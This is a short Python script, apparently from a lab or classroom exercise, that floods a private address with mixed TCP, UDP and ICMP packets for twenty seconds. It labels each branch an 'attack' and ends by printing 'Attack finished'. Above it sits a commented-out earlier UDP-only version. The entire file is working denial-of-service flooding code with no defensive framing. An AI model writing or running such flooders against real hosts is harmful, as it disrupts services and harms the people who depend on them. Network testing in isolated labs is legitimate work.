#import socket
#import time
#from scapy.all import *

#target_ip="10.0.0.8"
#port=random.randint(1,65535)
#port =80
#sock=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

#start_time=time.time()
#i=1
#while time.time()-start_time<20:
#    message="sent {} packet to {} through port {}".format(i,target_ip,port)
#    sock.sendto(message.encode(), (target_ip,port))
#    print(message)
#    i+=1
#sock.close()

 


import socket
import time
import random
from scapy.all import *
 
target_ip = "10.0.0.1"
 
start_time = time.time()
i = 1
 
while time.time() - start_time < 20:
    # Randomly select the protocol for the current iteration
    protocol = random.choice(["TCP", "UDP", "ICMP"])
 
    if protocol == "TCP":
        # TCP attack
        target_port = random.randint(1, 5)  # Random port
        tcp_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            tcp_sock.connect((target_ip, target_port))
            tcp_message = f"TCP packet {i}"
            tcp_sock.sendall(tcp_message.encode())
            tcp_sock.close()
            print(f"Sent TCP packet {i} to {target_ip}:{target_port}")
        except Exception as e:
            print(f"Failed to send TCP packet {i} to {target_ip}:{target_port}: {str(e)}")
 
    elif protocol == "UDP":
        # UDP attack
        udp_port = random.randint(1, 5)
        udp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        udp_message = "UDP packet"
        udp_sock.sendto(udp_message.encode(), (target_ip, udp_port))
        udp_sock.close()
        print(f"Sent UDP packet {i} to {target_ip}:{udp_port}")
 
    elif protocol == "ICMP":
        # ICMP attack
        send(IP(dst=target_ip)/ICMP()/"ICMP packet")
        print(f"Sent ICMP packet {i} to {target_ip}")
 
    i += 1
 
print("Attack finished")